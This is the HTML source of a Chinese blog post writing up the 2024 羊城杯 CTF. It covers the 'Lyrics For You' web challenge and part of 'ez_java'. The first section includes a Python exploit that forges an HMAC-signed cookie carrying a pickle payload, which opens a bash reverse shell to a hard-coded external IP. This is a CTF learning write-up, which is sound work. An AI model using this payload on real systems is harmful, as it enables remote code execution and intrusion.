@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2024/10/12/2024羊城杯wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="WEBLyrics For You打开环境，发现有个任意文件读取   读取源码   根据源码可知还有&#x2F;config&#x2F;secret_key，和有个cookie.py     copy下来源码可知还有一个 &#x2F;login，&#x2F;board路由 代码审计可知，是用secret_code对cookie进行了加密，对用户post传参username的值组合成一个字典，经过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024羊城杯WP">
+<meta property="og:url" content="http://laijunyue.github.io/2024/10/12/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEBLyrics For You打开环境，发现有个任意文件读取   读取源码   根据源码可知还有&#x2F;config&#x2F;secret_key，和有个cookie.py     copy下来源码可知还有一个 &#x2F;login，&#x2F;board路由 代码审计可知，是用secret_code对cookie进行了加密，对用户post传参username的值组合成一个字典，经过">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps15.jpg">
+<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps16.jpg">
+<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps17.jpg">
+<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps18.jpg">
+<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps19.jpg">
+<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps20.jpg">
+<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps21.jpg">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16e6FibZ8fSowjS1CpE6QKNzTLFhSQiciaLc7ggOt9JtVch1Skia6abibGYMQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16iaXS2tZ1oodONNFcqYomKSNbr1QyYqH8jbu4fM6UdJTsfMh0fqcafzA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16DVh3JyibjI6Ae3vAD8EDbrysbvSSbaUU04PRE9BQcvaY6l8DsocMI3w/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16RIiaeyiaym1BZ4FuSQyO32CZibFCiaz2et6NC6jgtDum8ymXTMEaZJ8fIg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16ml1xXXUCT9lGuNYXF9EYZRlBxjGjD3IYvUdS2qicfx8tCRm0HQvtuBQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16YIPQV1fiaumWVSoI1q6WS0yJpyb3H58iaqpSlX531aCvOG8rb6CbxC1w/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16ibIiam56VVat3TVTojyRHD8WUVicIEYWU3Ly9ABd36WV5yMYeiaGWucKoA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16YMeiaAKPiaJBlUexA1vgRaPmrCXAdJPsVIsr3p54icsw1pf9m5gk51Y6g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16Ud6iayrVaLjeQ9dvP5azmVyVyrAXfbQDv8hsoFyxDHfXA67706Bt74g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16uzBAKcYb0bWiatDObxF9sT44FhwTic86kPCvzCSdn4IzhrO3ypibUNWgQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16dgNIOyu2WlpZQ4Syoa6bxmRw2NYSKQSyu3XZmd9REzbO7n5rkJibiauw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16XJnxpoMHzPRbqabG4P4b5LDh6gkibcKqzf6J6UBiaSTk4Eawswic3p21A/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/vTLDcxb9m5FpqAuqvUnmVN1N5ChH7qRdot0d0LdgUdiamPPGDfUyc9eEOaadtmLbsnbU05IcU15emAFoZCAekAw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/vTLDcxb9m5FpqAuqvUnmVN1N5ChH7qRdV68N0BGmD76DVOKe3xX8e52Um2gpTyKcKhpmWnjFLA6ezORV0wwN9Q/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812133539446.png">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812133237053.png">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812132632141.png">
+<meta property="og:image" content="c:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812132511640.png">
+<meta property="article:published_time" content="2024-10-12T07:08:05.000Z">
+<meta property="article:modified_time" content="2025-08-19T10:28:27.356Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml26992/wps15.jpg">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2024羊城杯WP -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","欢迎来到我的博客(｡･∀･)ﾉﾞ","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">2024羊城杯WP</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/redefine-avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-10-12 15:08:05</span>
+        <span class="mobile">2024-10-12 15:08:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-19 18:28:27</span>
+            <span class="mobile">2025-08-19 18:28:27</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p>打开环境，发现有个任意文件读取</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml26992\wps15.jpg"
+                      alt="img"
+                > </p>
+<p>读取源码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml26992\wps16.jpg"
+                      alt="img"
+                > </p>
+<p>根据源码可知还有&#x2F;config&#x2F;secret_key，和有个cookie.py</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml26992\wps17.jpg"
+                      alt="img"
+                > </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml26992\wps18.jpg"
+                      alt="img"
+                > </p>
+<p>copy下来源码可知还有一个 &#x2F;login，&#x2F;board路由</p>
+<p>代码审计可知，是用secret_code对cookie进行了加密，对用户post传参username的值组合成一个字典，经过 &#x2F;board路由后对这个字典进行反序列化操作，提取出里面的username键值并判断是否是admin，漏洞点显然是&#x2F;board下的反序列化，但是由于经过&#x2F;login后我们传的值变成了字典，所有无法触发picke反序列化进行RCE</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml26992\wps19.jpg"
+                      alt="img"
+                > </p>
+<p>因此就要用&#x2F;config&#x2F;secret_key，和cookie.py 里的加密函数对我们rce的序列化字符进行加密后在&#x2F;board 上打picke反序列化进行RCE</p>
+<p>Exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, pickle, hmac, hashlib</span><br><span class="line"></span><br><span class="line">unicode = <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, -<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.decode(enc, err) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>) <span class="keyword">else</span> unicode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">secret_code = <span class="string">&quot;EnjoyThePlayTime123456&quot;</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;(cos\nsystem\nS\&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/112.124.46.244/2333 0&gt;&amp;1&quot;\&#x27;\no.&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = touni(cookie_encode((name, data), secret_code))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br></pre></td></tr></table></figure></div>
+
+<p>在&#x2F;board路由中设置cooike反弹shell，运行根目录下的readflag即可得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml26992\wps20.jpg"
+                      alt="img"
+                > </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="file:///C:\Users\27284\AppData\Local\Temp\ksohtml26992\wps21.jpg"
+                      alt="img"
+                ></p>
+<h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><h3 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h3><blockquote>
+<p>本题涉及知识点：Java代码审计、反序列化、URLClassLoader#addURL</p>
+</blockquote>
+<ul>
+<li>题目类型：CTF</li>
+<li>题目名称：2024羊城杯 ez_java</li>
+<li>内部端口：8888</li>
+<li>题目附件：6ZO+5o6lOiBodHRwczovL3Bhbi5iYWlkdS5jb20vcy8xbXpuYkF6QWJOeDJqb0R4VG1PR1R2USDmj5Dlj5bnoIE6IGRhdG8&#x3D;（自行Base64解码）</li>
+</ul>
+<h3 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 18888:8888 -e FLAG=flag&#123;8382843b-d3e8-72fc-6625-ba5269953b23&#125; ccr.ccs.tencentyun.com/lxxxin/public2:ycb2024_ez_java</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h3><p>下载附件，审计代码，题目结构如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16e6FibZ8fSowjS1CpE6QKNzTLFhSQiciaLc7ggOt9JtVch1Skia6abibGYMQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                >image.png</p>
+<p>用到的依赖如下，正常做题分析如下：</p>
+<ul>
+<li>shiro是自带CB依赖的，所以后面可以尝试一下CB的相关利用链（后面被黑名单ban了）</li>
+<li>MariaDB可能会有类似JDBC的打法，其实一开始在做题时就在考虑打MariaDB的JDBC，但没找到</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://mmbiz.qpic.cn/sz_mmbiz_png/icibBdzwC6ics93icymKp8dlpXovWXNCkv16iaXS2tZ1oodONNFcqYomKSNbr1QyYqH8jbu4fM6UdJTsfMh0fqcafzA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1"
+                      alt="图片"
+                ></p>
+<p>MyObjectInputStream类过滤了下方这些类，注意是通过resolveClass的方式获取classname，所以无法通过UTF8 Overlong Encoding的方式绕过</p>
